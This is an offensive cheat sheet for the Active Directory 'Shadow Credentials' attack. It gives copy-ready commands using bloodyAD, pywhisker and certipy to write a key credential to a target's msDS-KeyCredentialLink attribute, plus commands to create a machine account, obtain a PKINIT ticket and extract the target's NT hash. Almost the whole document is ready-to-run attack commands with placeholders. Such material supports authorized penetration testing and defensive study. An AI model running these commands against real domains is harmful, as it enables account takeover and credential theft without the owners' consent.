# Shadow Credentials

Write a key credential to `msDS-KeyCredentialLink` on a target, then PKINIT to authenticate as them and recover their NT hash. Requires GenericWrite or stronger on the target (typically a computer account when MachineAccountQuota>0, or a user where you've previously chained ACL writes).

### Add shadow creds (bloodyAD)

Add shadow creds (bloodyAD) with Shadow Credentials.

Linux-side: write `msDS-KeyCredentialLink` on the target via bloodyAD. Drops a `.pfx` and prints its password.

```sh title:"Shadow Credentials Add Shadow Creds (bloodyAD)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add shadowCredentials $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### Add shadow creds (pywhisker)

Add shadow creds (pywhisker) with Shadow Credentials.

pywhisker - dedicated tool for shadow credentials, supports add/list/remove/export.

```sh title:"Shadow Credentials Add Shadow Creds (pywhisker)"
pywhisker.py -d $domain -u $user -p $pass --target $target_user --action add
```
<!-- cheat
import domain_ip
var user
var pass
var target_user
-->

### Add shadow creds (certipy)

Add shadow creds (certipy) with Shadow Credentials.

certipy bundles the shadow-credentials flow with `auto` — adds the key credential, fetches the .pfx, requests the TGT, decrypts the NT hash, then removes the key credential. One-shot end-to-end.

```sh title:"Shadow Credentials Add Shadow Creds (certipy)"
certipy shadow -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $target_user auto
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var target_user
-->

### Create machine account (MachineAccountQuota > 0)

Create machine account (MachineAccountQuota > 0) with Shadow Credentials.

If the target is a user (no GenericWrite available) but `ms-DS-MachineAccountQuota > 0`, create a controlled computer account to use for RBCD/shadow chains.

```sh title:"Shadow Credentials Create Machine Account (MachineAccountQuota > 0)"
addcomputer.py $domain/$user:$pass -method LDAPS -computer-name $rhost_name -computer-pass $target_pass -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
var user
var pass
var rhost_name
var target_pass
-->

### PKINIT TGT from PFX

Run PKINIT TGT from PFX with Shadow Credentials.

After dropping a `.pfx` via pywhisker / bloodyAD, request a TGT via PKINIT.

```sh title:"Shadow Credentials Run PKINIT TGT from PFX"
gettgtpkinit.py -cert-pfx $pfx_file -pfx-pass $pfx_pass $domain/$target_user $ccache_file
```
<!-- cheat
import domain_ip
var pfx_file
var pfx_pass
var target_user
var ccache_file
-->

### Extract NT hash from PKINIT TGT

Extract NT hash from PKINIT TGT with Shadow Credentials.

UnPAC-the-hash flow - decrypt the PAC out of the PKINIT TGT to recover the user's NT hash.

```sh title:"Shadow Credentials Extract NT Hash from PKINIT TGT"
KRB5CCNAME=$ccache_file getnthash.py -key $as_rep_key $domain/$target_user
```
<!-- cheat
import domain_ip
var ccache_file
var as_rep_key
var target_user
-->
